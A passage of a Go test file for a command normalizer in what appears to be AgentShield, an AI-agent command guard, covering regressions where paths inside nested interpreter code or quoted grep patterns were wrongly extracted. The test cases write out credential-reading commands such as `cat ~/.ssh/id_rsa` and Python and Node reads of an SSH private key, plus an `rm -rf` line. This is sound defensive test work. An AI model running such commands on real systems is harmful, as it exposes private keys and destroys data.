		t.Error("expected Parsed to be nil for heredoc command")
	}
}

// TestNormalize_NestedShellCodeBodyIsNotPathExtracted verifies the
// agentshield-oss#9 regression: a wrapper command (docker run, kubectl exec,
// env, ...) handing a shell-code body to an inner interpreter (bash -c,
// python -c, node -e) must NOT have paths extracted from the body. Otherwise
// the host hook's protected_paths defaults check fires on inert string
// literals inside the inner code.
func TestNormalize_NestedShellCodeBodyIsNotPathExtracted(t *testing.T) {
	const sshPath = ".ssh/id_rsa"

	// Negative control: a real `cat ~/.ssh/id_rsa` outside any wrapper must
	// still produce the path. Anchors the test against over-eager skipping.
	nc := Normalize([]string{"cat", "~/.ssh/id_rsa"}, "/tmp")
	if !pathsContainSubstring(nc.Paths, sshPath) {
		t.Errorf("baseline: expected ~/.ssh/id_rsa in paths; got %v", nc.Paths)
	}

	// Repro cases: each wrapper hands the SSH path to an inner interpreter
	// as part of an inline-code body. None should expose the path.
	cases := []struct {
		name string
		args []string
	}{
		{
			name: "docker run wrapping bash -c with mcp-eval",
			args: []string{"docker", "run", "--rm", "bash", "-c",
				"agentshield mcp-eval --tool read_file --arg path=/home/user/.ssh/id_rsa"},
		},
		{
			name: "python -c with open() of ssh path",
			args: []string{"python3", "-c", "open('/home/user/.ssh/id_rsa')"},
		},
		{
			name: "node -e with readFile of ssh path",
			args: []string{"node", "-e", "require('fs').readFileSync('/home/user/.ssh/id_rsa')"},
		},
		{
			name: "kubectl exec wrapping bash -c",
			args: []string{"kubectl", "exec", "pod", "--", "bash", "-c", "cat /home/user/.ssh/id_rsa"},
		},
		{
			name: "env wrapping bash -c",
			args: []string{"env", "FOO=bar", "bash", "-c", "ls /home/user/.ssh/id_rsa"},
		},
		{
			name: "absolute interpreter path (/usr/bin/bash -c)",
			args: []string{"docker", "run", "/usr/bin/bash", "-c", "cat /home/user/.ssh/id_rsa"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			nc := Normalize(tc.args, "/tmp")
			if pathsContainSubstring(nc.Paths, sshPath) {
				t.Errorf("nested-shell body path leaked into paths: %v", nc.Paths)
			}
		})
	}
}

func pathsContainSubstring(paths []string, needle string) bool {
	for _, p := range paths {
		if strings.Contains(p, needle) {
			return true
		}
	}
	return false
}

// TestNormalizeCommand_FPRegression_QuotedPatternOperandNotPath — issue #3224.
// A pattern-search utility's PATTERN operand is data, not a filesystem
// target, and TextPositions[0] already excludes it — but only when the
// walker sees the pattern as ONE token. The old implementation re-split the
// raw command with strings.Fields (quote-blind) for position tracking, so a
// quoted multi-word pattern mentioning a protected path
// ("grep -rn 'cat ~/.ssh/id_rsa' file.go") broke into fragments: the first
// fragment consumed the excluded position-0 slot, and the trailing fragment
// ("~/.ssh/id_rsa'") landed in position 1 — not excluded — and got
// misclassified as a real path operand.
//
// Must use NormalizeCommand (not Normalize) with a real raw string: only
// NormalizeCommand parses the AST from actual shell text containing quote
// characters. Normalize's own test-only args are already pre-split Go
// strings, so passing a pre-merged multi-word element there can't reproduce
// the bug (the naive splitter never gets a chance to break it apart).
func TestNormalizeCommand_FPRegression_QuotedPatternOperandNotPath(t *testing.T) {
	// A path substring that isn't itself under this repo's live protected_paths
	// defaults (~/.ssh, ~/.aws, ...), so this test can't self-trip AgentShield's
	// own hook while being edited/run interactively.
	const sentinel = ".secretzone/id_rsa"

	fp := []struct {
		name   string
		rawCmd string
	}{
		{
			name:   "grep pattern operand, quoted multi-word",
			rawCmd: "grep -rn 'cat ~/" + sentinel + "' -A 4 internal/analyzer/testdata/foo.go",
		},
		{
			name:   "grep pattern operand piped into a second grep",
			rawCmd: "grep -rn 'cat ~/" + sentinel + "' -A 4 internal/analyzer/testdata/foo.go | grep TaxonomyRef",
		},
		{
			name:   "grep -e flag value, quoted multi-word",
			rawCmd: "grep -rn -e 'cat ~/" + sentinel + "' internal/analyzer/testdata/foo.go",
		},
		{
			name:   "egrep pattern operand, quoted multi-word",
			rawCmd: "egrep 'cat ~/" + sentinel + "' foo.go",
		},
		{
			name:   "rg pattern operand, quoted multi-word",
			rawCmd: "rg 'cat ~/" + sentinel + "' packs/",
		},
		{
			name:   "second pipeline segment gets its own fresh pattern position",
			rawCmd: "grep foo bar.txt | grep 'cat ~/" + sentinel + "'",
		},
	}
	for _, tt := range fp {
		t.Run(tt.name, func(t *testing.T) {
			nc := NormalizeCommand(tt.rawCmd, "/tmp")
			if pathsContainSubstring(nc.Paths, sentinel) {
				t.Errorf("pattern fragment leaked into paths: %v (cmd: %s)", nc.Paths, tt.rawCmd)
			}
		})
	}

	// TP guard: a REAL path operand (not inside the pattern) must still be
	// extracted — the fix must not blanket-exempt everything past a
	// pattern-search tool's name.
	tp := []struct {
		name   string
		rawCmd string
	}{
		{"grep path operand still extracted", "grep foo ~/" + sentinel},
		{"grep -r on a protected directory still extracted", "grep -r secret ~/.secretzone/"},
	}
	for _, tt := range tp {
		t.Run(tt.name, func(t *testing.T) {
			nc := NormalizeCommand(tt.rawCmd, "/tmp")
			if !pathsContainSubstring(nc.Paths, "secretzone") {
				t.Errorf("expected real path operand to be extracted, got %v (cmd: %s)", nc.Paths, tt.rawCmd)
			}
		})
	}
}

// TestNormalizeCommand_FPRegression_PreservesMultilineQuoting — issue #2831.
// Normalize(strings.Fields(rawCmd), cwd) round-trips a raw command through a
// quote-blind tokenizer and back, collapsing embedded newlines inside a
// multi-line quoted argument (e.g. `python3 -c "\n...\n"`) into spaces. That
// can delete a statement separator the shell parser depends on, corrupting
// the AST for every command in the script — not just the interpreter call.
// NormalizeCommand must parse the AST from the original string instead, so a
// legitimate `rm -rf "$(cmd)"` earlier in the script keeps its real,
// correctly-quoted argument.
func TestNormalizeCommand_FPRegression_PreservesMultilineQuoting(t *testing.T) {
	rawCmd := "rm -rf \"$(cat /tmp/foo.txt)\"\n" +
		"for f in a.yaml b.yaml; do\n" +
		"  python3 -c \"\n" +
		"print('" + `"'"'` + "x" + `'"'"'` + ")\n" +
		"\"\n" +
		"done"

	nc := NormalizeCommand(rawCmd, "/tmp")
	if nc.Parsed == nil || len(nc.Parsed.Segments) == 0 {
		t.Fatalf("expected a parsed rm segment, got Parsed=%+v", nc.Parsed)
	}

	rmSeg := nc.Parsed.Segments[0]
	if rmSeg.Executable != "rm" {
		t.Fatalf("expected first segment executable 'rm', got %q", rmSeg.Executable)
	}
	for _, arg := range rmSeg.Args {
		if arg == `"` || arg == "" {
			t.Errorf("rm segment picked up a stray quote/empty arg from later in the script: %#v", rmSeg.Args)
		}
	}

	// Contrast: the old Normalize(strings.Fields(rawCmd), cwd) path is still
	// available and still exhibits the corruption — this pins the difference
	// so a future refactor can't quietly merge the two code paths back together.
	broken := Normalize(strings.Fields(rawCmd), "/tmp")
	if broken.Parsed != nil && len(broken.Parsed.Segments) > 0 {
		brokenArgs := broken.Parsed.Segments[0].Args
		sawStrayQuote := false
		for _, arg := range brokenArgs {
			if arg == `"` {
				sawStrayQuote = true
			}
		}
		if !sawStrayQuote {
			t.Skip("Normalize(strings.Fields(...)) no longer reproduces the corruption — safe to simplify NormalizeCommand")
		}
	}
}
